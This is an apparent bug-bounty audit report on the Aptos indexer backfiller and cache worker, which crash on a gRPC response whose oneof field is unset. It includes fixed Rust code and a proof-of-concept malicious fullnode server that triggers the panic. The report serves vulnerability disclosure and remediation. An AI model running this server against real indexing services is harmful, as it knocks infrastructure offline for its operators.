# Audit Report

## Title
Indexer File Store Backfiller Crash via Malformed gRPC Response from Malicious Fullnode

## Summary
The indexer-grpc-file-store-backfiller unconditionally unwraps the optional `response` field of `TransactionsFromNodeResponse` messages at two locations, causing a panic crash if a malicious or buggy fullnode sends a protobuf message with this field set to `None`. This enables denial-of-service attacks against Aptos indexing infrastructure.

## Finding Description
The `Processor::backfill()` function in the file store backfiller contains two unsafe `unwrap()` calls on the `response` field of `TransactionsFromNodeResponse` messages received from a fullnode gRPC stream. [1](#0-0) [2](#0-1) 

The protobuf definition shows that `response` is a `oneof` field, which maps to `Option<Response>` in the Rust implementation: [3](#0-2) [4](#0-3) 

In protobuf3, `oneof` fields are optional by design. A valid protobuf message can be constructed with no variant set, resulting in `response: None` in Rust. When the backfiller receives such a message, the `unwrap()` calls panic and crash the process.

**Attack Path:**
1. Attacker deploys a malicious gRPC fullnode server that implements the `FullnodeData` service
2. Backfiller operator configures their backfiller to connect to this malicious endpoint
3. Malicious fullnode sends `TransactionsFromNodeResponse` messages with `response: None`
4. Backfiller panics at line 159 (first frame) or line 276 (subsequent frames)
5. Backfiller process crashes, disrupting indexing operations

While the legitimate fullnode implementation always sets the `response` field: [5](#0-4) [6](#0-5) 

The backfiller cannot assume all fullnodes are legitimate or bug-free. The code violates the principle of defensive programming by trusting external input without validation.

## Impact Explanation
This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:

- **API crashes**: The backfiller is a critical indexing infrastructure component that can be crashed remotely by a malicious fullnode
- **Significant protocol violations**: The backfiller should handle malformed responses gracefully rather than crashing

The impact includes:
- Denial of service against Aptos indexing infrastructure
- Disruption of historical transaction data backfilling
- Potential validator impact if validators use backfillers for indexing operations
- Repeated exploitation possible by continuously sending malformed responses

The same vulnerability exists in the cache worker at a similar location: [7](#0-6) 

## Likelihood Explanation
**Likelihood: Medium to High**

- **Attacker Requirements**: Low - attacker only needs to implement a malicious gRPC server
- **Attack Complexity**: Low - sending a protobuf message with an unset field is trivial
- **Attack Prerequisites**: Backfiller must be configured to connect to the malicious endpoint
- **Realistic Scenario**: If backfiller operators use untrusted or compromised fullnode endpoints, or if legitimate fullnodes have bugs that accidentally omit the response field

The attack is realistic because:
1. Backfiller operators may connect to third-party fullnodes for cost/performance reasons
2. Network attackers could potentially intercept and modify gRPC responses
3. Buggy fullnode implementations could accidentally send malformed messages
4. The vulnerability can be repeatedly exploited to prevent backfilling operations

## Recommendation
Replace all `unwrap()` calls on `response.response` with proper error handling using pattern matching or `ok_or` with descriptive error messages.

**For line 159:**
```rust
let init_frame = match grpc_stream.next().await {
    Some(Ok(response)) => match response.response {
        Some(resp) => resp,
        None => anyhow::bail!("Received response without response field"),
    },
    Some(Err(e)) => return Err(e.into()),
    None => anyhow::bail!("Failed to get the first frame"),
};
```

**For line 276:**
```rust
let resp = match response.response {
    Some(resp) => resp,
    None => {
        tracing::error!("Received TransactionsFromNodeResponse without response field");
        anyhow::bail!("Malformed response from fullnode: missing response field");
    },
};
```

This ensures the backfiller handles malformed responses gracefully by returning an error rather than panicking, allowing for proper error logging and recovery mechanisms.

## Proof of Concept

**Malicious gRPC Server (Rust):**

```rust
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    GetTransactionsFromNodeRequest, PingFullnodeRequest, PingFullnodeResponse,
    TransactionsFromNodeResponse,
};
use tonic::{transport::Server, Request, Response, Status};

#[derive(Default)]
pub struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        std::pin::Pin<Box<dyn futures::Stream<Item = Result<TransactionsFromNodeResponse, Status>> + Send>>;

    async fn get_transactions_from_node(
        &self,
        _req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = tokio::sync::mpsc::channel(10);
        
        tokio::spawn(async move {
            // Send malformed response with None response field
            let malformed = TransactionsFromNodeResponse {
                response: None,  // This will cause the backfiller to panic
                chain_id: 1,
            };
            let _ = tx.send(Ok(malformed)).await;
        });

        Ok(Response::new(Box::pin(tokio_stream::wrappers::ReceiverStream::new(rx))))
    }

    async fn ping(&self, _req: Request<PingFullnodeRequest>) 
        -> Result<Response<PingFullnodeResponse>, Status> {
        Ok(Response::new(PingFullnodeResponse { info: None }))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "[::1]:50051".parse()?;
    let malicious = MaliciousFullnode::default();

    println!("Malicious fullnode listening on {}", addr);
    Server::builder()
        .add_service(FullnodeDataServer::new(malicious))
        .serve(addr)
        .await?;

    Ok(())
}
```

**Test Steps:**
1. Run the malicious gRPC server on a test endpoint
2. Configure the backfiller to connect to this endpoint
3. Start the backfiller with any valid configuration
4. Observe the backfiller panic with "called `Option::unwrap()` on a `None` value"

The same attack vector affects the cache worker, which has an identical vulnerability.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L154-159)
```rust
        let init_frame = grpc_stream
            .next()
            .await
            .expect("Failed to get the first frame")?
            .response
            .unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L276-276)
```rust
            let resp = response.response.unwrap();
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L47-51)
```text
message TransactionsFromNodeResponse {
  oneof response {
    StreamStatus status = 1;
    TransactionsOutput data = 2;
  }
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L79-84)
```rust
pub struct TransactionsFromNodeResponse {
    /// Making sure that all the responses include a chain id
    #[prost(uint32, tag="3")]
    pub chain_id: u32,
    #[prost(oneof="transactions_from_node_response::Response", tags="1, 2")]
    pub response: ::core::option::Option<transactions_from_node_response::Response>,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L245-260)
```rust
pub fn get_status(
    status_type: StatusType,
    start_version: u64,
    end_version: Option<u64>,
    ledger_chain_id: u8,
) -> TransactionsFromNodeResponse {
    TransactionsFromNodeResponse {
        response: Some(transactions_from_node_response::Response::Status(
            StreamStatus {
                r#type: status_type as i32,
                start_version,
                end_version,
            },
        )),
        chain_id: ledger_chain_id as u32,
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L187-194)
```rust
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L189-189)
```rust
    match response.response.unwrap() {
```
